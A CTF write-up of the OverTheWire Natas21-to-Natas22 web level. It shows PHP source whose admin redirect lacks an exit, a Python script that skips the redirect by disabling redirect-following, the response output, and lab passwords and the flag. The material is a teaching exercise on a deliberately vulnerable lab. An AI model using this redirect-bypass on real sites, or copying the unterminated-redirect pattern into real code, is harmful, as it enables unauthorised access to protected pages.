# CTF Writeup - **OverTheWire Natas21 - Natas22**

**Author**: spiketyson 

---

## Challenge Details

- **Challenge Name:** Natas21 - Natas22
- **Category:** Linux
- **Difficulty Level:** Easy
- **Date:** 21-12-2024

---

## Summary

This challenge is the introductory level for the Natas series on OverTheWire, focusing on web exploitation. The goal is to find the flag that is hidden web server using burpsuite if possible.

---

## Approach

Since this is an basic challenge, I planned to use python to find the flag using redirects blocking.

---

## Solution Walkthrough

Connecting to the web server using:

```bash
Username: natas22
Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz
URL:      http://natas22.natas.labs.overthewire.org
```

After logging in, we can see that the webpage doesnot show anything to us. This is not very helpful or interesting for finding any clues. Lets directly view the source code of the webpage.

```bash
<?php
session_start();

if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
    header("Location: /");
    }
}
?>

<?php
    if(array_key_exists("revelio", $_GET)) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas23\n";
    print "Password: <censored></pre>";
    }
?>
```

We can see that this php code checks if there is a parameter `revelio` in the request based on that it check if the requested user is `admin` or not. The non admin users are redirected to `/` instead of the actual webpage. This is interesting for us as we can take advantage of this by disallowing redirects as it doesnot not check if the requested user is admin after going to the webpage. The second piece of code again checks if the request has `revelio` in it and then prints credentials. The request should contain `revelio` in it. Lets try it send it using python as shown below.


```bash
import requests

target = 'http://natas22.natas.labs.overthewire.org?debug=true&revelio=true&admin=1'
auth = ('natas22','d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz')

session = requests.Session()

r = session.get(target, auth=auth, allow_redirects=False)
print(r.text)
```

The above script creates a session first with a request. It sends the `revelio` parameter using url and send a get request along with disabling the redirects. We wont be redirected to `/` even though we are not admin users.  The below ouput shows that we are able to get the credentials for the next level.

```bash
# <html>
# <head>
# <!-- This stuff in the header has nothing to do with the level -->
# <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
# <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
# <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
# <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>       
# <script>var wechallinfo = { "level": "natas22", "pass": "d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz" };</script></head>
# <body>
# <h1>natas22</h1>
# <div id="content">

# You are an admin. The credentials for the next level are:<br><pre>Username: natas23
# Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs</pre>
# <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
# </body>
# </html>
```


## Flag

**Flag:** dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs


---

## Lessons Learned

It was a simple challenge. I didnt quite understand the php code of header(), but once i understood the concept, I was able to solve it.